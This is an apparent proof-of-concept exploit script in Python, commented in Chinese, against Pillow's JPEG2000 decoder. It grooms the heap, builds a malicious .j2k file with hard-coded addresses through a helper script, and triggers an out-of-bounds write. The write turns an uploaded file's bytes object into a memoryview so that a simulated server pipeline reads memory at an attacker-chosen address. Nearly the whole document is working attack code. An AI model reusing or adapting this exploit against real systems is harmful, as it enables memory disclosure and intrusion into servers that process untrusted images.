#!/usr/bin/env python3
# 服务器驱动读取（最终版）：
#   victim = "服务器收到的上传文件 bytes" data（先于解码存在）
#   groom  : 在 data 下面留 0x230 空洞 => tp_index 落进去 => 写窗口正好覆盖 data 的头部
#   OOB 写 : data 被混淆成 memoryview，buf = scratch（低地址、可控内容）
#   之后管线再经 BytesIO(data) 读取 => 它读到的是 scratch 的内容 => 服务器驱动读取成立
import ctypes, gc, io, os, struct, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value

# --- 1) scratch：必须是【大对象】才能落在 brk 堆的【低地址】（小对象走 mmap 高地址 ✗）---
img = Image.new('L', (8, 8), 200)
b = io.BytesIO(); img.save(b, 'JPEG2000')
CONTENT = b.getvalue()
scratch = bytearray(4096)                    # >=512 => glibc（brk 堆，低地址 ✓）
scratch[0:len(CONTENT)] = CONTENT
SADDR = ctypes.addressof((ctypes.c_char * 4096).from_buffer(scratch))
print("[*] scratch=%#x  内容=%d 字节  首字节=%r" % (SADDR, len(CONTENT), bytes(scratch[:4])))
print("    可表达(<0x1000000)? %s" % ("是 ✓" if SADDR < 0x1000000 else "否 ✗ —— 需要更大/更早分配"))

if SADDR >= 0x1000000:
    print("[!] scratch 地址太高，中止（先要让大对象走 brk 堆）")
    sys.exit(1)

# --- 2) 构造恶意文件：A=type 地址, B=中间值, C=buf=SADDR ---
r = subprocess.run(['python3', '/tmp/mk13.py', '/tmp/exp/base.j2k', '/tmp/SRV.j2k',
                    '0', '23', hex(0xa350c8), hex(0xa40000), hex(SADDR), '-370'],
                   capture_output=True, text=True)
print("[*] build:", (r.stdout + r.stderr).strip()[:90])
assert 'OK' in r.stdout, "build 失败"
print("[*] 文件大小 =", os.path.getsize('/tmp/SRV.j2k'))

# --- 3) 模拟服务器：先拿到"上传文件 bytes"（此刻分配 data，并在它下面留洞）---
pad = bytes(544)                              # 0x230 档，先占住
data = open('/tmp/SRV.j2k', 'rb').read()      # data 会在 pad 上面
print("[*] pad=%#x  data=%#x  (data-pad=%#x)" % (id(pad), id(data), id(data) - id(pad)))
del pad
gc.collect()

# --- 4) 触发解码（服务器路径）：这一次会用 data 作为输入 ---
try:
    im = Image.open(io.BytesIO(data))
    im.load()
    print("[*] 第一次解码（触发 OOB 写）完成:", im.size)
except BaseException as e:
    print("[*] 第一次解码异常 %r" % (e,))

# --- 5) 检查 data 是否被混淆 ---
print("[*] data+0x08 = %#x  (期望 memoryview=0xa350c8)" % R(id(data) + 8))
print("[*] data+0x38 = %#x  (期望 %#x)" % (R(id(data) + 0x38), SADDR))

if R(id(data) + 8) != 0xa350c8:
    # 也试试直接看窗口里的写是否落到 data 附近
    print("[-] data 未被混淆（不在窗口内）。看看是哪个对象被改了：")
    for k in range(0, 0x40):
        a = id(data) + 8 * k
        v = R(a)
        if v == 0xa350c8:
            print("    命中偏移 data+%#x" % (8 * k))
    sys.exit(0)

# --- 6) 管线再读一次：应读出 scratch 的内容（= 我们放的小图） ---
print("[+] 进入管线第二次读取（经 BytesIO(data)）")
try:
    im2 = Image.open(io.BytesIO(data))
    im2.load()
    print("[+] 解出的图:", im2.size, im2.mode, "首像素 =", im2.getpixel((0, 0)))
    print("    期望    :", img.size, img.mode, "首像素 =", img.getpixel((0, 0)))
    if (im2.size, im2.mode) == (img.size, img.mode):
        print("\n★★★ 服务器驱动读取成立：管线读到的是【我们指定地址】的内容")
except BaseException as e:
    print("[-] 第二次读取异常 %r" % (e,))